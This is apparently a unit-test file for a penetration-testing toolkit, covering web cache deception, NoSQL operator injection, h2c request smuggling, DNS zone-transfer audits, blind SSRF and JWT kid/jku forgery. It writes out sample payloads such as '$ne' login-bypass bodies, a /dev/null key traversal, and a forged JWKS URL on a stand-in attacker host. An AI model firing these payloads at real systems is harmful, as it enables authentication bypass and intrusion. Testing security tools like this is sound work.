// Unit tests for the 2026-09-24 batch-2 tools (no network): cacheDecep,
// nosqlHunt, smuggle h2c mode, dnsAudit, blindSsrf, jwt kid/jku.
import { describe, expect, it } from "vitest";
import { deceiveVariants, isSpaCatchAll, cacheHint } from "./cacheDecep";
import { operatorBodies, mongoFingerprint, classifyOutcome, getParamPayload } from "./nosqlHunt";
import { buildProbe, classifySmuggle } from "./smuggleProbe";
import { parseAxfrOutput, dnssecVerdict, caaSummary } from "./dnsAudit";
import { ssrfLabel, ssrfPayloads, attributeHits, DEFAULT_SSRF_PARAMS } from "./blindSsrf";
import { jwtAttack } from "./jwt";

describe("cacheDecep", () => {
  it("builds classic deception variants around a protected path", () => {
    const vs = deceiveVariants("https://lab.test/account/profile?id=7");
    expect(vs.length).toBe(5);
    expect(vs.some((v) => v.url === "https://lab.test/account/profile.css?id=7")).toBe(true);
    expect(vs.some((v) => v.url.endsWith("/account/profile/test.css?id=7"))).toBe(true);
    // semicolon path-param variant stays raw (server decides parsing)
    expect(vs.some((v) => v.url.includes(";test.css"))).toBe(true);
  });
  it("falls back to /account on a bare origin and rejects non-http", () => {
    expect(deceiveVariants("https://lab.test/").every((v) => v.url.includes("/account"))).toBe(true);
    expect(deceiveVariants("ftp://lab.test/x")).toEqual([]);
  });
  it("SPA catch-all is rejected, stored-protected-content is not", () => {
    const shell = "<html><body>App Shell — 404 not found page</body></html>";
    const protectedBody = "<html><body>Account of user 7 — SECRET DASHBOARD</body></html>";
    expect(isSpaCatchAll(protectedBody, shell, "https://x/account.css")).toBe(true);
    expect(isSpaCatchAll(protectedBody, protectedBody, "https://x/account.css")).toBe(false);
    // decoy filename echoed in body = catch-all tell
    expect(isSpaCatchAll(protectedBody, "<html>requested account.css not found</html>", "https://x/account.css")).toBe(true);
  });
  it("cacheHint picks the interesting cache headers", () => {
    expect(cacheHint({ "x-cache": "HIT", "content-type": "text/html" })).toContain("x-cache: HIT");
    expect(cacheHint({ "content-type": "text/html" })).toBeUndefined();
  });
});

describe("nosqlHunt", () => {
  it("builds bounded operator bodies for the given fields", () => {
    const cases = operatorBodies(["user", "pass"]);
    expect(cases.length).toBe(8);
    const ne = cases.find((c) => c.name === "user.$ne");
    expect(ne?.body).toBe('{"user":{"$ne":""}}');
    expect(cases.every((c) => ["operator", "syntax"].includes(c.kind))).toBe(true);
  });
  it("caps default fields at 4 and cases at 12", () => {
    expect(operatorBodies([]).length).toBeLessThanOrEqual(12);
    expect(operatorBodies(["a", "b", "c", "d", "e", "f"]).length).toBe(16 > 12 ? 12 : 16);
  });
  it("fingerprint detects Mongo/BSON error text", () => {
    expect(mongoFingerprint('{"error":"BSONTypeError: Argument passed in $in must be an array"}')).toMatch(/BSONTypeError/);
    expect(mongoFingerprint('{"ok":true}')).toBeNull();
  });
  it("classifyOutcome: lead only on success-vs-fail, info on 5xx/fingerprint, none on same", () => {
    const base = { status: 401, location: "" };
    expect(classifyOutcome(base, { status: 200, location: "", body: "welcome" })).toBe("lead");
    expect(classifyOutcome(base, { status: 302, location: "/home", body: "" })).toBe("lead");
    expect(classifyOutcome(base, { status: 500, location: "", body: "boom" })).toBe("info");
    expect(classifyOutcome(base, { status: 400, location: "", body: "Unexpected token $" })).toBe("info");
    expect(classifyOutcome(base, { status: 401, location: "", body: "invalid" })).toBe("none");
    expect(classifyOutcome({ status: 0, location: "" }, { status: 200, location: "", body: "" })).toBe("none");
  });
  it("GET param payload keeps the operator shape", () => {
    expect(getParamPayload("url")).toBe("url[$ne]=");
  });
});

describe("smuggle h2c mode", () => {
  it("builds the h2c upgrade probe with Connection/Upgrade headers", () => {
    const p = buildProbe("h2c", "lab.test", "/x", "canary-not-used");
    expect(p).toContain("Upgrade: h2c");
    expect(p).toContain("Connection: Upgrade, HTTP2-Settings");
    expect(p).toContain("HTTP2-Settings:");
    expect(p.startsWith("GET /x HTTP/1.1")).toBe(true);
  });
  it("classify: 101 status line = h2c SIGNAL", () => {
    expect(classifySmuggle("HTTP/1.1 101 Switching Protocols\r\n\r\n", "c").verdict).toBe("SIGNAL");
    expect(classifySmuggle("HTTP/1.1 101 Switching Protocols\r\n\r\n", "c").reason).toContain("h2c");
  });
  it("classify: 101 in a BODY never fakes h2c (false-positive guard)", () => {
    const out = "HTTP/1.1 200 OK\r\nContent-Length: 101\r\n\r\nnumber 101 ok";
    expect(classifySmuggle(out, "c").verdict).toBe("NO-DESYNC");
  });
  it("classify: h2c preface counts, plain responses still NO-DESYNC", () => {
    expect(classifySmuggle("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", "c").verdict).toBe("SIGNAL");
    expect(classifySmuggle("HTTP/1.1 200 OK\r\n\r\nok", "c").verdict).toBe("NO-DESYNC");
  });
});

describe("dnsAudit", () => {
  it("parses a dumped AXFR zone", () => {
    const raw = [
      "example.com. 3600 IN SOA ns1.example.com. admin.example.com. 1 2 3 4 5",
      "example.com. 3600 IN NS ns1.example.com.",
      "www.example.com. 300 IN A 1.2.3.4",
      "internal.example.com. 300 IN A 10.0.0.5",
      ";; Query time: 3 msec",
      ";; XFER size: 4",
    ].join("\n");
    const p = parseAxfrOutput(raw);
    expect(p.dumped).toBe(true);
    expect(p.records).toBe(4);
    expect(p.sample.length).toBeGreaterThan(2);
  });
  it("a refused/timed-out transfer is NOT a dump", () => {
    expect(parseAxfrOutput(";; Transfer failed: REFUSED").dumped).toBe(false);
    expect(parseAxfrOutput(";; communication timed out").dumped).toBe(false);
  });
  it("DNSSEC verdicts", () => {
    expect(dnssecVerdict("257 3 8 AwEAAaXy…")).toBe("signed");
    expect(dnssecVerdict("")).toBe("unsigned");
    expect(dnssecVerdict(";; communications error: timed out")).toBe("unknown");
  });
  it("CAA summary", () => {
    expect(caaSummary([{ issue: "letsencrypt.org" }])).toContain("issue=letsencrypt.org");
    expect(caaSummary([])).toContain("tidak ada record");
  });
});

describe("blindSsrf", () => {
  it("labels are DNS-safe and param-attributed", () => {
    expect(ssrfLabel(3, "WebHook URL!")).toBe("p3-webhook-url");
    expect(ssrfLabel(0, "???")).toBe("p0-p");
  });
  it("payloads carry the attributed label in all forms", () => {
    const ps = ssrfPayloads(2, "fetch", "abc.oast.fun");
    expect(ps[0]).toBe("http://p2-fetch.abc.oast.fun/x");
    expect(ps[1]).toContain("p2-fetch.abc.oast.fun");
    expect(ps.length).toBe(3);
  });
  it("attributeHits extracts param indices from poll text (deduped, sorted)", () => {
    const poll = "• [dns/A] 10.0.0.1 p0-url.abc.oast.fun\n• [dns/A] p0-url.abc.oast.fun\n• [dns/A] 10.0.0.2 p3-fetch.abc.oast.fun";
    const hits = attributeHits(poll);
    expect(hits.length).toBe(2);
    expect(hits[0]).toMatchObject({ idx: 0, param: "url" });
    expect(hits[1]).toMatchObject({ idx: 3, param: "fetch" });
  });
  it("default params list is bounded and url-first", () => {
    expect(DEFAULT_SSRF_PARAMS.length).toBeLessThanOrEqual(20);
    expect(DEFAULT_SSRF_PARAMS[0]).toBe("url");
  });
});

describe("jwt kid/jku", () => {
  const tok = `${Buffer.from('{"alg":"HS256","typ":"JWT"}').toString("base64url")}.${Buffer.from('{"sub":"1","role":"user"}').toString("base64url")}.sig`;
  it("kid builds traversal tokens signed with an empty key", () => {
    const out = jwtAttack({ action: "kid", token: tok, claims: '{"role":"admin"}' });
    expect(out).toContain("kid-injection");
    expect(out).toContain("/dev/null");
    expect(out).toMatch(/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
  });
  it("jku renders the forged unsigned token + attacker JWKS steps", () => {
    const out = jwtAttack({ action: "jku", token: tok, publicKey: "https://evil.test/jwks.json" });
    expect(out).toContain("jku-injection");
    expect(out).toContain("https://evil.test/jwks.json");
    expect(out).toContain("RS256");
  });
  it("decode summary lists the new actions", () => {
    expect(jwtAttack({ action: "decode", token: tok })).toContain("kid | jku");
  });
});
